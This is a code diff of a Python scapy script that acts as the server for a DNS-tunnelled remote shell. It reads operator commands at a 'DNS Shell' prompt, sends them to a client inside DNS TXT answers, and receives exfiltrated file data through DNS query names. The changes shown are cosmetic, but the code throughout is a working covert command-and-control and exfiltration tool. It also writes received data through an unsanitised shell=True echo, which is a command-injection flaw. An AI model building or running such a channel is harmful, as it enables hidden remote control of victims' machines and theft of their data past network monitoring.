@@ -3,18 +3,20 @@ import subprocess
 import os
 from scapy.all import DNS, DNSQR, DNSRR, IP, send, sniff, sr1, UDP, RandShort
 
+class color:
+  BOLD = '\033[1m'
+  RED='\033[1;31m'
+  END = '\033[0m'
+
 
 def handle_packet(packet):
     #packet.show()
     if packet[DNS].qd.qname.decode() == "client ready." and packet[DNS].qr == 0:
-        print("Client ready!!\n")
-        command = input("[Server] Enter command to execute on client:\n")
-        print("command = ", command)
-        #send_packet(packet, command)
+        #print("client ready\n")
+        command = input(color.RED + "┌──(DNS㉿Shell)\n└─$ "+color.END)
         send_packet(packet, command)
-        #print(".......................................................")
+        print(".......................................................")
     else:
-       # packet.show()
         data = packet[DNS].qd.qname.decode()
         if data.startswith("data"):
             print("file sent")
@@ -30,8 +32,7 @@ def send_packet(packet, command):
                     UDP(dport=packet[UDP].sport, sport=53) / \
                     DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNSQR], \
                         an=DNSRR(type = 'TXT', rdata = command))
-    response.show()
-    send(response)
+    send(response, verbose = False)
 
 def TransferFile(messasge):
 	subprocess.check_output('echo "' + messasge + '" > file_sent.txt' , shell=True)
